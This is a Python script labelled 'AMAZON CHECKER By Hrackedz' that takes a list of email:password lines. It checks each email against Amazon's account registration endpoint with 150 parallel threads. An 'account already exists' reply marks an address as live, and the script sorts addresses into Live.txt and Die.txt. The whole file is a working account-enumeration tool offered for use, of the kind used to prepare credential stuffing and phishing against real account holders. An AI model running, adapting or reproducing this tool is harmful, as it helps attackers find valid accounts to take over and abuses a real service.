#!/usr/bin/python3
from time import time
import requests
import os
from multiprocessing.dummy import Pool 
import sys,ctypes


try:
     os.mkdir('Results')
except:
    pass
list=input("\033[33;1mInput Mail List : \033[0m")
link = "https://www.amazon.com/ap/register?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fdp%2FB07Z8PWC6R%2F%3F_encoding%3DUTF8%26ref_%3Dnav_newcust&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&"
head = {'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}
s = requests.session()
g = s.get(link, headers=head)
list = open(list, 'r')
print("-"*50)
gg = []
live = 0
dead = 0
for line in list:
    gg.append(line.rstrip('\n'))
def scan(email):
    global live, dead
    try:
        if not email:
            pass
        bacot = email.strip().split(':')
        xxx = {'customerName':'Androsex','email': bacot[0],'emailCheck': bacot[0],'password':'xwarning','passwordCheck':'xwarning'}
        cek = s.post(link, headers=head, data=xxx).text
        if "You indicated you're a new customer, but an account already exists with the email address" in cek:
            print("\033[32;1mLIVE\033[0m | " +email+ " | [ \033[32;1m VALID \033[0m ]")
            live += 1
            open('Results/Live.txt', 'a') .write(email + '\n')
        else:
            print("\033[31;1mDIE\033[0m  | " +email+ " | [ \033[31;1m INVALID \033[0m ]")
            dead += 1
            open('Results/Die.txt', 'a') .write(email + '\n')
    except requests.exceptions:
        time.sleep(10)
        pass        
    if os.name == 'nt':
        ctypes.windll.kernel32.SetConsoleTitleW(' AMAZON CHECKER By Hrackedz  | Good- {} | BAAD- {}'.format(live, dead))
    else :
        sys.stdout.write('AMAZON CHECKER By Hrackedz  | Good- {} | BAAD- {}'.format(live, dead))	
def start():
    pool = Pool(150)
    pool.map(scan, gg)
    pool.close()
    pool.join()

start()
print("\033[33;1mDone!\033[0m")
print("-"*50)
print("\033[35;1mProccess Checking Done\033[0m")
print("Valid Email Saved In : \033[32;1mLive.txt")
print("\033[0mInvalid Email Saved In : \033[31;1mDie.txt")
